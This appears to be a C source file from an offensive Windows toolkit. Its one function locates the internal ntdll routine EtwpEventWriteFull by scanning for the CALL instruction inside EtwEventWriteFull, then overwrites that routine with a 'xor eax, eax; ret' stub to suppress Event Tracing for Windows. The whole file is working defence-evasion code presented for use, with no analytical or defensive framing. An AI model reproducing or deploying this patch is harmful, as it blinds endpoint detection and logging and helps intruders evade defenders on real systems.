#include "Common.h"

// -----------------------
// Functions
// -----------------------

// Patches EtwpEventWriteFull (internal) to suppress ETW event writes
BOOL EtwPatching(
    _In_ HANDLE hProcess
)
{
    PVOID   pEtwEventWriteFullAddress  = NULL;
    PVOID   pEtwpEventWriteFullAddress = NULL;
    PBYTE   pbByte                     = NULL;
    DWORD   dwOffset                   = 0;
    BYTE    bPatch[]                   = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
    DWORD   dwOldProtect               = 0;
    SIZE_T  cbRegion                   = sizeof(bPatch);
    HMODULE hNtdll                     = NULL;

    if (hProcess == NULL)
        return FALSE;

    hNtdll = GetModuleHandleW(L"ntdll.dll");

    if (hNtdll == NULL)
        hNtdll = LoadLibraryW(L"ntdll.dll");

    if (hNtdll == NULL)
    {
        PRINTA("[!] Failed to get ntdll.dll: %lu\n", GetLastError());
        return FALSE;
    }

    pEtwEventWriteFullAddress = (PVOID)GetProcAddress(hNtdll, "EtwEventWriteFull");

    if (pEtwEventWriteFullAddress == NULL)
        return FALSE;

    // Walk forward from EtwEventWriteFull until we find a RET (0xC3)
    pbByte = (PBYTE)pEtwEventWriteFullAddress;

    while (*pbByte != 0xC3)
        pbByte++;

    // Walk backward from the RET to find the preceding CALL (0xE8)
    while (*pbByte != 0xE8)
        pbByte--;

    // Skip the E8 opcode; pbByte now points at the 4-byte relative offset
    pbByte++;

    dwOffset = *(PDWORD)pbByte;

    // Advance past the offset; pbByte is now the address of the next instruction
    pbByte += sizeof(DWORD);

    // target = nextInstructionAddress + signedOffset
    pEtwpEventWriteFullAddress = (PVOID)((ULONG_PTR)pbByte + (LONG_PTR)(LONG)dwOffset);

    if (!VirtualProtect(pEtwpEventWriteFullAddress, cbRegion, PAGE_READWRITE, &dwOldProtect))
    {
        PRINTA("[!] VirtualProtect [RW] failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwpEventWriteFullAddress, bPatch, sizeof(bPatch));

    if (!VirtualProtect(pEtwpEventWriteFullAddress, cbRegion, dwOldProtect, &dwOldProtect))
    {
        PRINTA("[!] VirtualProtect [RX] failed with error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
